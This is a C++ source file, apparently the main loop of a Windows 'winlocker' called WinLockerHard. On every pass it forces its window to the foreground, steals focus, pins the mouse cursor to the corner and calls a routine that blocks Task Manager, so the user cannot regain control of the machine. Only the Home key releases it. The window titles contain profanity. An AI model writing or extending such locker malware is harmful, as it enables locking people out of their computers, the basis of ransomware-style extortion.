#include "Loader.h"
#include "WinLockerHard.h"
#include "utils.h"

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,_In_opt_ HINSTANCE hPrevInstance,_In_ LPWSTR lpCmdLine,_In_ int nCmdShow)
{
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);
   
 
    loader->initWindow(hInstance,nCmdShow, "fuck?", "fuck", false);
    HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_WINLOCKERHARD));
    utils utilities;
    MSG msg;
    // Цикл основного сообщения:
    while (!loader->unload)
    {
        if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        SetForegroundWindow(loader->getHWND());
        SetFocus(loader->getHWND());
        SetCursorPos(0, 0);
        mouse_event(0, 0, 0, 0, 0);    
        loader->getRenderManager()->render_start();
        loader->getRenderManager()->render_end();
        utilities.preventTaskManager();
        if (GetAsyncKeyState(VK_HOME))
        {
            loader->unload = true;
        }
    }
    return (int) msg.wParam;
}